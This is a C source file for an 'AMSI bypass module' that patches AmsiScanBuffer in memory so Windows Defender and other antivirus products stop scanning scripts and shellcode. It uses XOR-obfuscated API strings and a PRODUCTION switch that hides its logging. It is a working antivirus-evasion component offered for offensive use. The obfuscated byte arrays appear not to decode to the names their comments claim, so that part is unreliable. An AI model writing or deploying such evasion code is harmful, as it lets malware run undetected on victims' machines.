/*
 * ============================================================================
 * AMSI BYPASS MODULE
 * ============================================================================
 *
 * Author: 28Zaakypro@proton.me
 * 
 * The Antimalware Scan Interface (AMSI) scans scripts and in-memory content
 * before their execution. Windows Defender and other antivirus products use it
 * to detect malicious PowerShell scripts, shellcode, etc.
 *
 * BYPASS TECHNIQUE:
 * Patch AmsiScanBuffer() so that it always returns “clean.”
 *
 * METHOD:
 * Replace the beginning of AmsiScanBuffer with code that returns an error.
 * AMSI interprets an error as “safe” (no scan).
 *
 * PATCH:
 * mov eax, 0x80070057  ; Error E_INVALIDARG
 * ret
 *
 * ============================================================================
 */

#include "amsi_bypass.h"
#include "obfuscation.h"

/*
 * PatchAmsiScanBuffer
 * -------------------
 * Patches the AmsiScanBuffer function in amsi.dll.
 *
 * PROCESS:
 * 1. Load amsi.dll
 * 2. Get the address of AmsiScanBuffer
 * 3. Change memory protections
 * 4. Write the patch
 * 5. Restore protections
 */

BOOL PatchAmsiScanBuffer() {
    printf("[*] Patching AmsiScanBuffer...\n");
    
    // Obfuscated "amsi.dll" (XOR 0x42)
    BYTE obfAmsiDll[] = {0x23, 0x2D, 0x2B, 0x2A, 0x00, 0x26, 0x2E, 0x2E};
    char amsiDll[16];
    DeobfuscateString(obfAmsiDll, 8, 0x42, amsiDll);
    
    // Charger amsi.dll
    HMODULE hAmsi = LoadLibraryA(amsiDll);
    if (!hAmsi) {
        #ifndef PRODUCTION
        printf("    [!] Failed to load AMSI library: %d\n", GetLastError());
        #endif
        return FALSE;
    }
    
    #ifndef PRODUCTION
    printf("    AMSI library loaded at 0x%p\n", hAmsi);
    #endif
    
    // Obfuscated "AmsiScanBuffer" (XOR 0x42)
    BYTE obfAmsiScan[] = {0x03, 0x2D, 0x2B, 0x2A, 0x31, 0x21, 0x23, 0x2C, 0x04, 0x2D, 0x24, 0x24, 0x27, 0x30};
    char amsiScan[20];
    DeobfuscateString(obfAmsiScan, 14, 0x42, amsiScan);

    // Get the address of AmsiScanBuffer
    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, amsiScan);
    if (!pAmsiScanBuffer) {
        #ifndef PRODUCTION
        printf("    [!] Target function not found\n");
        #endif
        return FALSE;
    }
    
    #ifndef PRODUCTION
    printf("    Target function at 0x%p\n", pAmsiScanBuffer);
    #endif

    // Change protections
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("    [!] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }
    
    // Patch : mov eax, 0x80070057; ret
    // 0xB8 = mov eax, imm32
    // 0x57, 0x00, 0x07, 0x80 = 0x80070057 (E_INVALIDARG)
    // 0xC3 = ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    
    #ifndef PRODUCTION
    printf("    [✓] Target function patched\n");
    printf("        Patch : B8 57 00 07 80 C3 (mov eax, 0x80070057; ret)\n");
    #endif

    // Restore protections
    DWORD temp;
    VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &temp);
    
    // Flush instruction cache
    FlushInstructionCache(GetCurrentProcess(), pAmsiScanBuffer, 6);
    
    return TRUE;
}

/*
 * DisableAMSI
 * -----------
 * Disables AMSI by patching AmsiScanBuffer.
 */
BOOL DisableAMSI(AMSI_RESULT* result) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       AMSI BYPASS                                     ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    
    result->success = FALSE;
    result->amsiScanBufferPatched = FALSE;

    // Patch AmsiScanBuffer
    result->amsiScanBufferPatched = PatchAmsiScanBuffer();
    result->success = result->amsiScanBufferPatched;
    
    return result->success;
}

void PrintAMSIResult(AMSI_RESULT* result) {
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       RÉSULTAT DU BYPASS AMSI                         ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    
    if (result->success) {
        printf("SUCCESS: AMSI disabled\n");
        #ifndef PRODUCTION
        printf("  • Target function patched : YES\n");
        #endif
        printf("\n");
        printf("  [INFO] Scripts and shellcode will no longer be scanned.\n");
        printf("         Windows Defender can no longer analyze content.\n");
    } else {
        printf("FAILED: AMSI bypass failed\n");
    }
    
    printf("\n");
}
